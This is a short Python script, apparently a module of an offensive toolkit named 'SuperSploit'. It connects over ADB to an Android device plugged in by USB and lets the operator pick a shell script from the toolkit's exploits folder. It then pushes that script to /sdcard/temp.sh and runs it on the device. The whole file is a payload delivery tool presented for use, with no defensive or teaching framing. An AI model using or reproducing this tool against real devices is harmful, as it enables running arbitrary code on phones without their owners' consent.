# integrated = True
# !#!#!
# This uses adb to create a connection to
# a device that's plugged in via usb and attempts to
# deliver a payload via adb shell
#
# REQUIRED OPTIONS
# !#!#!
import os
from subprocess import run
from prompt_toolkit import prompt as input
from ppadb.client import Client as AdbClient

client = AdbClient(host="127.0.0.1", port=5037)
devices = client.devices()


def Shell():
    if len(devices) > 1:
        de = devices[int(input("Enter device index: "))]
    else:
        de = devices[0]
    installation = f'{os.getenv("HOME")}/.SuperSploit'
    sh_programs = []
    for i in os.listdir(f"{installation}/exploits/Linux"):
        if i.endswith(".sh"):
            sh_programs.append(i)
    for y in sh_programs:
        print(f"{sh_programs.index(y)}:{y}")
    de.push(f"{installation}/exploits/Linux/{sh_programs[int(input('Enter the index of the program: '))]}",
            "/sdcard/temp.sh")
    run(["adb", "-s", de.get_serial_no(), "shell", "sh", "/sdcard/temp.sh"])
    return True

def main():
    funcs = [Shell]
    inputs = ["shell"]
    while True:
        try:
            data = input("shell/c: ")
            if data in inputs:
                funcs[inputs.index(data)]()
        except Exception:
            return

main()